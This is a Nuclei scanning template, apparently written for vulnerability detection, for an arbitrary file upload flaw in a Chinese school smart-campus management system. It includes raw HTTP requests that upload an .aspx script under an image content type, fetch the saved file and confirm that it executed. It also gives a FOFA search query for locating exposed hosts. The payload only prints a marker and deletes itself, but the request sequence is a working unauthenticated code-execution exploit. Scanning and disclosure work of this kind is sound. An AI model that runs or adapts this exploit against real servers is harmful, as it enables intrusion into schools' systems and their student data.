id: smartedu-new-new-fileupload
info:
  name: 新中新中小学智慧校园信息管理系统 Upload - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: body="/Login/IndexMobi"
  tags: 2024,fileupload,edu,smartedu

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /PSE/Upload HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Length: 149
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
        Content-Type: image/jpg

        <%@Page Language="C#"%><%Response.Write("{{randstr}}");System.IO.File.Delete(Request.PhysicalPath);%>
        --00content0boundary00--
        
      - |+
        GET /Upload/PrimarySchoolEnrollment/{{getfile}} HTTP/1.1
        Host: {{Hostname}}

    extractors: 
      - type: json
        part: body_1
        internal: true
        name: getfile
        json:
          - ".SaveName"

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and